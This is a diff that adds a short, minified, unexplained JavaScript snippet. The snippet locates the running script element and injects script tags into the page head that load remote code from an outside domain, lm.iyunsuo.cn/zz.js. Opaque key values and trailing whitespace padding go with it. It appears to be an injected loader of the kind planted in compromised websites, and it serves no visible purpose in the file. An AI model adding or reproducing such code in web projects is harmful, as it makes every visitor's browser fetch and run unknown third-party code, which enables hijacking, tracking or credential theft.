@@ -1,0 +1,6 @@
+window.k_l = ["855Csn66oX","L13qui38ou", "8Wql1b53Ue"];
+(function(w){var d=document,ns=function(){if(d.currentScript){return d.currentScript;}
+var ss=new Array(),scripts=d.getElementsByTagName("script");if(scripts!=null&&scripts.length>0){for(var i=scripts.length-1;i>=0;i--){var script=scripts[i];if(script.readyState==="interactive"){return script;}else if(script.getAttribute('src')!=null&&script.getAttribute('src').indexOf('_r=1_0')==-1){ss.push(script);}}
+if(ss!=null&&ss.length>0){return ss[parseInt(1E5*Math.random())%ss.length];}}}
+(),fjjs=function(t,p){h=d.getElementsByTagName("head")[0]||d.documentElement;if(t!=undefined&&t!=''){r=d.createElement("script");r.src=t;h.insertBefore(r,h.firstChild);}
+if(p!=undefined&&p!=''){r=d.createElement("script");r.src=p;h.insertBefore(r,h.firstChild);}},s=ns&&ns.getAttribute('src');if(s==null){fjjs('','https://lm.iyunsuo.cn/zz.js?_r=1_0&ich=s');}else{fjjs(s+(s.indexOf('?')==-1?'?':'&')+'_r=1_0&ich=s','https://lm.iyunsuo.cn/zz.js?_r=1_0&ich=s');}})(window);                                                           
